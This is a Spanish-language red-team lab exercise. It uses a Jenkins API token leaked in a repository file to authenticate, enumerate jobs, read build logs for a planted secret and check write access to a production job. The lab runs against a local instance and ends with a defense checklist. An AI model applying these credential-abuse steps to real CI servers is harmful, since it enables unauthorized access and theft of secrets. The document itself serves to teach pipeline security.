# 09 - Token de API expuesto: enumeracion y logs

**Clase 3 · 20 min · M4 Jenkins Demo 03**
**Fase:** movimiento lateral con credenciales validas
**MITRE ATT&CK:** T1552.001 (Credentials In Files), T1078 (Valid Accounts)
**Riesgo OWASP CI/CD:** CICD-SEC-6 (higiene de credenciales), CICD-SEC-2 (identidad y acceso)

## Escenario

En el repo hay otro archivo que no deberia estar:
`secrets/jenkins_token.txt`. Contiene usuario y token de API de Jenkins. No es
una vulnerabilidad de Jenkins: es una credencial valida filtrada. La pregunta de
red team es siempre la misma: **que puede hacer esta identidad?**

En este lab enumeras jobs y lees logs. En el 10 usaras el mismo token para
escribir.

Variante real: CVE-2026-40313 (abril de 2026) mostro que un token tambien puede
filtrarse **dentro de un artefacto**: `actions/checkout` deja el `GITHUB_TOKEN`
en `.git/config` y un paso posterior que sube artefactos lo publica. Aqui el
secreto esta en un log; alla, empaquetado en algo que parecia inocuo.

## Objetivo de aprendizaje

- Autenticarse contra la API REST de Jenkins con usuario + token.
- Enumerar jobs sin la UI.
- Leer `consoleText` de un build y encontrar secretos en logs.

## Antes de empezar

```bash
cd devops-redteam
source <(sed -n 's/^\(JENKINS_[A-Z]*\)=\(.*\)/export \1="\2"/p' seed/repo/secrets/jenkins_token.txt)
echo "$JENKINS_USER / ${JENKINS_TOKEN:0:6}..."
```

**Que esperar:** `devops / <prefijo>`. No imprimas el token completo.

## Paso 1 - Confirmar la identidad

```bash
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" \
  http://localhost:8080/me/api/json \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["id"], d["fullName"])'
```

**Que esperar:** `devops devops`. Si devuelve `401`, el token no es valido o
fue rotado.

## Paso 2 - Enumerar jobs

```bash
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" http://localhost:8080/api/json \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["url"]);[print(" -",j["name"]) for j in d["jobs"]]'
```

**Que esperar:**

```
http://localhost:8080/
 - build-and-push
 - prod-deploy
```

Cada job expone tambien `/job/<nombre>/config.xml`, `/api/json` y
`/lastBuild/consoleText`. Es un inventario completo de la automatizacion.

## Paso 3 - Leer el log del deploy

```bash
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" \
  http://localhost:8080/job/prod-deploy/lastBuild/consoleText | tail -10
```

**Que esperar:**

```
+ echo FLAG{jenkins_api_token_logs}
FLAG{jenkins_api_token_logs}
+ echo [prod-deploy] done
Finished: SUCCESS
```

**Por que pasa:** el job imprime el flag como si fuera una variable de entorno.
En produccion ese patron es comun: `echo $TOKEN`, `set -x`, o un `docker login
--password-stdin` mal puesto. Los logs son una fuente de credenciales.

Si el job no tiene builds:

```bash
curl -s -o /dev/null -w '%{http_code}\n' -u "$JENKINS_USER:$JENKINS_TOKEN" \
  -X POST http://localhost:8080/job/prod-deploy/build
sleep 5
```

## Paso 4 - Comprobar permisos de escritura (sin ejecutar aun)

```bash
curl -s -o /dev/null -w 'config.xml %{http_code}\n' \
  -u "$JENKINS_USER:$JENKINS_TOKEN" \
  http://localhost:8080/job/prod-deploy/config.xml
```

**Que esperar:** `200`. Un token de automatizacion no deberia poder leer ni
escribir la configuracion de un job de produccion. Guarda este dato para el lab
10.

## Paso 5 - Alternativa con CLI (opcional)

Si tienes Java:

```bash
curl -s -o /tmp/jenkins-cli.jar http://localhost:8080/jnlpJars/jenkins-cli.jar
java -jar /tmp/jenkins-cli.jar -s http://localhost:8080 \
  -auth "$JENKINS_USER:$JENKINS_TOKEN" list-jobs
```

La API REST es suficiente; el CLI solo cambia la comodidad.

## Evidencia para el informe

- Identidad autenticada y hora.
- Lista de jobs.
- Linea del log con el secreto (redactada en el informe).
- Codigo de respuesta de `/config.xml`, que demuestra el exceso de permisos.

## Checkpoint

1. Por que un token filtrado es mas peligroso que un password filtrado?
2. Que deberia hacer un pipeline para no imprimir secretos en logs?
3. Que scope deberia tener un token que solo lanza builds?

## Defensa

- Tokens con caducidad, nombre por usuario y revocables.
- No imprimir secretos en logs (`set +x`, masking, `--password-stdin`).
- Auditar `/api/json`, `/config.xml` y `consoleText` con IPs o usuarios anomalos.
- Separar tokens de solo lectura (automatizacion) de tokens de escritura.
- Rotar el token del repo y eliminarlo del historial (lab 17).
